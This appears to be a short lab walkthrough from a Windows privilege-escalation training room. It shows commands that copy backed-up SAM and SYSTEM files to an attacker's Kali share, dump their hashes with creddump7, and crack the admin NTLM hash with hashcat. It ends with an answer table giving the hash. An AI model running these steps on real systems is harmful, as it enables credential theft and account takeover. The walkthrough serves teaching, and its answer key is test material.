The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.

Transfer the SAM and SYSTEM files to your Kali VM:

```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\   copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

```
git clone https://github.com/Tib3rius/creddump7   pip3 install pycrypto   python3 creddump7/pwdump.py SYSTEM SAM
```

Crack the admin NTLM hash using hashcat:

```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

You can use the cracked password to log in as the admin using winexe or RDP.

Answer the questions below

| Question                                 | Answer                           |
| ---------------------------------------- | -------------------------------- |
| What is the NTLM hash of the admin user? | a9fdfa038c4b75ebc76dc855dd74f0da |
